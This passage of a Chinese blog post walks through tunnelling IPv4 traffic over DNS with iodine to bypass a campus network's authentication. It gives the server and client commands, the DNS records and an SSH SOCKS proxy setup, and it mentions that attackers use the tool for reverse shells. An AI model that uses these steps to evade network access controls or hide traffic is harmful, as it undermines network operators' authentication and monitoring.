服务器指定将要查询一个域名，而本地域名服务器收到数据后，并不能成功解析，便只能将此数据包进行转发，转发到哪里呢？请注意上表中的 NS 记录，就是用来指定一个域名由 VPS 来进行解析；所以毫无疑问，数据包顺利地到达服务器。接下来我们同样可以在 VPS 上运行一个同样的程序，用来对伪装的数据包来进行还原，然后再将还原的数据包发送到互联网中。再然后服务器就会收到回来的响应数据包，再对此响应包进行 伪装成 DNS 响应数据包，按照过来的路径，反向地将伪装好的 DNS 响应数据包发送到本机 PC，PC 收到 DNS 伪装响应包后，再对其进行还原，最终达到本机 PC 收到真正需要的数据包。</p><p><img src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hlzc5fkj313t0h8dg6.jpg" alt="flow chart"></p><h2 id="开始实战"><a href="#开始实战" class="headerlink" title="开始实战"></a>开始实战</h2><h3 id="所需"><a href="#所需" class="headerlink" title="所需"></a>所需</h3><ul><li>VPS<ul><li>Ubuntu 16 serevr</li><li>带宽 1 Mbps</li><li>IP 148.70.218.239</li></ul></li><li>Domain<ul><li>0xf4n9x.com</li></ul></li></ul><table><thead><tr><th>主机记录</th><th>记录</th><th>值</th></tr></thead><tbody><tr><td>NS</td><td>d2t</td><td>tunnel.0xf4n9x.com</td></tr><tr><td>A</td><td>tunnel</td><td>47.73.228.119</td></tr></tbody></table><ul><li>PC<ul><li>Ubuntu 18 desktop</li></ul></li></ul><h3 id="伪装程序"><a href="#伪装程序" class="headerlink" title="伪装程序"></a>伪装程序</h3><p>前面谈原理的时候，说到需要一个对数据包做 DNS 伪装的程序。而这个实现这种功能的程序有很多。</p><p>就拿我用过的两款软件来说，第一个是 dns2tcp，第二个，也就是要说的主角就是 iodine。由于前者相较于后者较复杂，使用未成功，故弃之，主要说后者。</p><p>这个小工具可以通过 DNS 服务器对 IPv4 数据进行隧道传输。有时候防火墙禁止了其他类型的流量时，而 DNS 查询流量却未被禁用时，此时就可以用来传输正常 IPv4 流量。</p><p>这个工具其实是攻击者用来通过 DNS 隧道来反弹 shell 滴，不过我是拿来突破校园网认证。</p><p>Github：<a href="https://github.com/yarrick/iodine">https://github.com/yarrick/iodine</a></p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>由于是 Debian 系，所以安装特简单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install iodine</span><br></pre></td></tr></table></figure><p>然后运行起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iodined -f -c -P password 10.0.0.1 d2t.0xf4n9x.com</span><br></pre></td></tr></table></figure><p>参数解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-f 　前台运行</span><br><span class="line">-c 　禁用检查所有传入请求的客户端IP地址；默认情况，来自不匹配IP请求将被拒绝。</span><br><span class="line">-P　 设置认证密码</span><br></pre></td></tr></table></figure><p>后面那个 IP 得是一个保留地址，再然后跟一个所要查询的域名。就这样让程序在 VPS 后台运行着。</p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>同样是 Debian 系，安装方法同样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install iodine</span><br></pre></td></tr></table></figure><p>然后运行着，不要停止。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo iodine -f -P password d2t.0xf4n9x.com</span><br></pre></td></tr></table></figure><p>再然后，通过 ssh 服务器，使用9999端口来作为转发端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ubuntu@10.0.0.1 -D 9999</span><br></pre></td></tr></table></figure><p>不用很久，就会登录到服务器。</p><p><img src="/img/post/Bypass-campusNet/iodined.jpg" alt="iodined"></p><p>当出现上图标记的那段文字，即为成功。</p><h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>开启系统自带代理</p><p><img src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19ho5btdmj30j90dljrj.jpg"></p><p>或者使用浏览器插件 <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif">SwitchyOmega</a>（墙裂推荐）</p><p>Github：<a href="https://github.com/FelisCatus/SwitchyOmega">github.com&#x2F;FelisCatus&#x2F;SwitchyOmega</a></p><p><img src="http://i1.wp.com/ww1.sinaimg.cn/large/006V665tgy1g19hohv40aj30vk0i7mxr.jpg"></p><p>代理服务器即本机，端口9999。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="/img/post/Bypass-campusNet/baidu.jpg"></p><h2 id="质量"><a href="#质量" class="headerlink" title="质量"></a>质量</h2><h3 id="关于网速"><a href="#关于网速" class="headerlink" title="关于网速"></a>关于网速</h3><p>我绕过认证次数总共两次，第一次是在凌晨接近2点左右，那时候网速还行；而第二次在在写这篇文章的白天下午，速度是出了奇的慢，打开个百度将近十秒钟。</p><p>另外，也和我的 VPS 出口带宽有莫大的关系；毕竟只有1Mbps。</p><h3 id="未遵循标准的结果"><a href="#未遵循标准的结果" class="headerlink" title="未遵循标准的结果"></a>未遵循标准的结果</h3><p>TCP&#x2F;IP 四层体系结构已明确规定各个协议的作用，如果非要在不该传输正常数据的端口中传输一切数据，那结果也可想而知。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.bennythink.com/udp53.html">UDP 53 免费上网、DNS 隧道经验谈</a></li><li><a href="http://zgao.top/2019/03/03/%E5%88%A9%E7%94%A8openvpn%E5%AE%9E%E7%8E%B0udp536768%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%AE%A4%E8%AF%81%E4%B8%8A%E7%BD%91/">利用openVPN实现udp53,67,68端口绕过校园网认证上网</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> dns </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
